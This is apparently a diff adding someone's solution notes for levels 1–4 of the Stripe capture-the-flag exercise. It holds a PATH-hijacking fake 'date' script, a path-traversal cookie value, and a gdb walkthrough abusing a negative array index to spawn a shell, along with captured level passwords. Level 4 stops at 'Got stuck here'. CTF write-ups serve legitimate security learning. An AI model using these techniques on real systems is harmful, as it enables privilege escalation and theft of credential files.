@@ -1,0 +1,122 @@
+________________________________________
+LEVEL 1
+________________________________________
+
+ssh level01@ctf.stri.pe
+
+
+Create a fake date program that exposes the password.
+
+
+echo "/bin/cat /home/level02/.password" > date
+chmod 755 date
+export PATH=$PWD
+/levels/level01
+
+
+level02
+kxlVXUvzv
+
+
+________________________________________
+LEVEL 2
+________________________________________
+
+
+Set the cookie to read the password:
+
+Cookie: user_details=../../home/level03/.password
+
+I used Edit My Cookies chrome plugin.
+
+
+/home/level03/.password
+
+http://ctf.stri.pe/level02.php
+
+../../home/level03/.password
+
+Or0m4UX07b
+
+
+________________________________________
+LEVEL 3
+________________________________________
+
+ssh level03@ctf.stri.pe
+Or0m4UX07b
+
+
+Link sh to the memory location of run.
+
+
+level03@ctf4:/tmp/tmp.3skO2s26Sb$ gdb /levels/level03
+Reading symbols from /levels/level03...done.
+(gdb) break truncate_and_call
+Breakpoint 1 at 0x8048780: file level03.c, line 57.
+(gdb) break main
+Breakpoint 2 at 0x80487d8: file level03.c, line 68.
+(gdb) run 0 asdf
+Starting program: /levels/level03 0 asdf
+warning: the debug information found in "/lib/ld-2.11.1.so" does not match "/lib/ld-linux.so.2" (CRC mismatch).
+
+
+Breakpoint 2, main (argc=3, argv=0xff836154) at level03.c:68
+(gdb) print &fns[0]
+$1 = (fn_ptr *) 0xff83608c
+(gdb) print &run
+$2 = (int (*)(const char *)) 0x804875b <run>
+(gdb) c
+Continuing.
+
+Breakpoint 1, truncate_and_call (fns=0xff83608c, index=0, user_string=0xff83793a "asdf") at level03.c:57
+57	in level03.c
+(gdb) print &buf[0]
+$3 = 0xff83601c "
+(gdb) print sizeof(void*)
+$4 = 4
+
+
+ff83608c - ff83601c = 70 = 112 decimal
+
+112 / 4 = 28
+
+(gdb) print &fns[-28]
+$5 = (fn_ptr *) 0xff83601c
+
+(gdb) quit
+
+0x804875b <run>
+echo $'\x5b\x87\x04\x08'
+
+ln -s /bin/sh $'\x5b\x87\x04\x08'
+export PATH=`pwd`:$PATH
+
+/levels/level03 -28 $'\x5b\x87\x04\x08'
+$ whoami
+level04
+$ cat /home/level04/.password    
+i5cBbPvPCpcP
+
+
+________________________________________
+LEVEL 4
+________________________________________
+
+
+ssh level04@ctf.stri.pe
+i5cBbPvPCpcP
+
+
+$ uname -a
+Linux ctf5.stri.pe 2.6.32-342-ec2 #43-Ubuntu SMP Wed Jan 4 18:22:42 UTC 2012 x86_64 GNU/Linux
+
+intel x86 NOP  0x90
+
+
+Got stuck here!
+
+Answer is exploiting a stack overflow in fun() but due to address space randomization, you have to run repeatedly (for example trying the same address)...
+
+
+
